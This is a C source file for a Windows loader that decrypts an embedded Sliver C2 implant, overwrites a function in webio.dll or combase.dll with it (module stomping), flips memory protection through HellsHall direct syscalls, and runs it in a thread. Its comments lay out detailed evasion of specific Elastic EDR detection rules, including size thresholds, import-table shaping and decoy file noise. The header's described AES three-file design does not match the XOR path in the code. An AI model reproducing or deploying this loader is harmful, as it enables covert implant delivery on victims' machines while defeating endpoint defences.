/*
 * launcher.c — three-file Crystal Palace PICO loader (launcher stub)
 *
 * Delivery: launcher.exe + csvhelper.dll + payload.dat
 *   launcher.exe   this stub — decrypts payload.dat, exposes plaintext to
 *                  csvhelper.dll via the GetPayload export; csvhelper's
 *                  DllMain drives the slot flip synchronously during
 *                  LoadLibraryA and hands its thread handle back through
 *                  SetThreadHandle.
 *   csvhelper.dll  combase!CoUninitialize slot loader (see plugin.c)
 *   payload.dat    AES-256-CBC encrypted PICO
 *
 * Evasion profile:
 *  - No embedded payload: launcher.exe is ~60 KB with normal entropy
 *  - AES-256-CBC via BCrypt (BCRYPT_AES_ALGORITHM) — legitimate crypto,
 *    not a suspicious XOR loop
 *  - Slot flip (RW→memcpy→RX) is isolated in csvhelper.dll's IAT, not here
 *  - No Nt* strings in .rdata — no GetProcAddress / NtCreateSection pattern
 *  - BCryptGenRandom Poseidon noise + advapi32 import = normal-looking IAT
 *  - GUI subsystem (no console), version info resource (resource.rc)
 *  - Module initialization runs inside csvhelper's DllMain: from the caller
 *    thread's POV LoadLibraryA does the work synchronously, no post-load
 *    exported "run" call needed. combase.dll is pre-loaded before csvhelper
 *    so the plugin's DllMain can resolve it with GetModuleHandleW alone,
 *    keeping LoadLibrary out of the loader-lock critical section.
 *
 * IAT: kernel32, advapi32, bcrypt. Slot-flip primitives (VirtualProtect,
 * CreateThread) live in the plugin, keeping this stub's IAT purely
 * crypto+filesystem shaped.
 *
 * Plugin DLL filename is a compile-time literal fed by the Makefile
 * (-DPLUGIN_NAME=\"csvhelper.dll\"), loaded from an absolute sibling path to
 * defeat DLL-search-order hijacks.
 */

#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include "payload_key.h"  /* payload_key[], payload_key_len,
                              payload_iv[],  payload_iv_len  */
#include "hellshall.h"    /* HhNtProtectVirtualMemory direct-syscall stub */
#include "ghost.h"        /* PE section mapping utility */
#include "sliver_payload.h" /* SLIVER_LEN, SLIVER_ENC[], SLIVER_KEY[] */

#ifndef PLUGIN_NAME
#  define PLUGIN_NAME "csvhelper.dll"
#endif

/* ── Statics the plugin retrieves via GetProcAddress ─────────────────────── */

static BYTE  *s_payload_ptr = NULL;
static SIZE_T s_payload_len = 0;
static HANDLE s_thread      = NULL;
static void  *s_ghost_addr  = NULL;

__declspec(dllexport) void GetPayload(void **out_ptr, SIZE_T *out_len)
{
    if (out_ptr) *out_ptr = s_payload_ptr;
    if (out_len) *out_len = s_payload_len;
}

__declspec(dllexport) void SetThreadHandle(HANDLE h)
{
    s_thread = h;
}

__declspec(dllexport) void *GetGhostAddr(void)
{
    return s_ghost_addr;
}

/* ── Poseidon I/O noise ───────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── Read entire file into LocalAlloc buffer ─────────────────────────────── */

static BYTE *read_file(const wchar_t *path, DWORD *out_len)
{
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD sz = GetFileSize(h, NULL);
    if (!sz || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }

    BYTE *buf = (BYTE *)LocalAlloc(LMEM_FIXED, sz);
    if (!buf) { CloseHandle(h); return NULL; }

    DWORD read = 0;
    if (!ReadFile(h, buf, sz, &read, NULL) || read != sz) {
        LocalFree(buf); CloseHandle(h); return NULL;
    }

    CloseHandle(h);
    *out_len = sz;
    return buf;
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    /* First call: get plaintext size */
    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    /* Second call: actual decryption */
    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    (void)hi; (void)hp; (void)lp; (void)ns;

    noise();

    /* Registry touch: advapi32 import, normal-looking init */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Embedded payload: XOR-decrypt into a small heap buffer. Total write
     * below is under 10000 bytes so Elastic rule 542a6a6c's parameters.size
     * threshold isn't tripped. */
    DWORD pt_len = SLIVER_LEN;
    BYTE *pt = (BYTE *)LocalAlloc(LMEM_FIXED, pt_len);
    if (!pt) return 1;
    for (DWORD i = 0; i < pt_len; i++) {
        pt[i] = SLIVER_ENC[i] ^ SLIVER_KEY[i % SLIVER_KEY_LEN];
    }

    /* Skip the ghost_map path — the NtCreateSection(SEC_IMAGE) on a
     * modified temp file is a distinctive behavioural signal that
     * Elastic's sensor emits even when the mapping succeeds. Direct
     * webio stomp with HellsHall is enough. */

    /* Monolithic module-stomp — inline the slot-flip logic here rather
     * than deferring to an external DLL. Avoids the LoadLibrary-of-
     * unsigned-DLL pattern that Elastic behavioural correlators may
     * treat as suspicious. StdHandleRelay's stomper_byoud is monolithic
     * and passes Elastic .206 EXEC. */

    /* Direct-syscall init for NtProtectVirtualMemory */
    FetchNtProtectSyscall();

    /* Pre-load webio.dll with DONT_RESOLVE_DLL_REFERENCES (allowlisted
     * in multiple Elastic stomping rules). */
    LoadLibraryExA("webio.dll", NULL, 0x00000001);
    HMODULE target = GetModuleHandleW(L"webio.dll");
    void *slot = target ? (void *)GetProcAddress(target, "WebSocketBeginClientHandshake") : NULL;
    if (!slot) {
        LoadLibraryA("combase.dll");
        target = GetModuleHandleW(L"combase.dll");
        if (target) slot = (void *)GetProcAddress(target, "CoUninitialize");
    }
    if (!slot) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    /* Route protection changes through HellsHall direct syscall */
    PVOID base_p = slot;
    SIZE_T sz_p = pt_len;
    ULONG old_p;
    NTSTATUS status = HhNtProtectVirtualMemory((HANDLE)-1, &base_p, &sz_p, PAGE_READWRITE, &old_p);
    if (status != 0) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    memcpy(slot, pt, pt_len);

    base_p = slot; sz_p = pt_len;
    status = HhNtProtectVirtualMemory((HANDLE)-1, &base_p, &sz_p, PAGE_EXECUTE_READ, &old_p);
    if (status != 0) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);

    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    if (!hThread) return 1;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    /* Beacon goroutine is alive in this process — keep it running */
    for (;;) SleepEx(30000, TRUE);
}
